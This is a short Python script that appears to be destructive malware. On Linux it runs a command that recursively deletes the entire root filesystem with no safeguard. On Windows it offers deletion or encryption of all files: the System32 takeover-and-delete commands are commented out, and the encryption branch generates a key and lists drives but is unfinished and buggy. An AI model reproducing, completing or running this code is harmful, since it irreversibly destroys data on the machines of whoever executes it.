import os
import subprocess
import platform
from cryptography.fernet import Fernet
import re
from string import ascii_uppercase


if(platform.system() == 'Windows'):
    print("Windows OS discovered. Getting System32's path...")
    delenc_choice = input('Del/Enc all files? ').lower()
    sys32_path = os.path.join(os.getenv("windir"), "System32")
    
    if(delenc_choice == 'del'):
        print('Starting deletion process...')

        # print('Taking ownership of System32...')
        # subprocess.run(['takeown', r'/f', sys32_path])
        # print('Deleting System32...')
        # subprocess.run(['cacls', sys32_path])
        # print('Done')


    if(delenc_choice == 'enc'):
        print('Starting Encryption process...')

        key = Fernet.generate_key()
        keyfunc = Fernet(key)

        drives_list = []
        for drive in ascii_uppercase:
            if os.path.exists(os.path.join(str(drive) + ":\\")):
                drives_list.append(str(drive) + ":\\")
    
        for i, drive in enumerate(drives_list):
            drive = drive.rstrip(drive[:-1]) # remove the extra backslash
            print(drive)
            if(drive in os.getenv('windir')):
                drives_list.pop(i)

        

if(platform.system() == 'Linux'):
    print('Linux OS discovered.')
    print('Deleting root...')
    subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
    print('Done.')
